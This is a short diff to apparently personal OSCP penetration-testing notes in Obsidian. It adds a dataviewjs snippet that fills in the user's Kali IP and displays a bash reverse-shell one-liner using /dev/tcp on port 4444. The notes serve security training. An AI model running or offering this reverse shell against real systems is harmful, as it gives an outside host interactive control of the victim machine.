@@ -7,6 +7,13 @@ const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 PHP METHOD 1
 
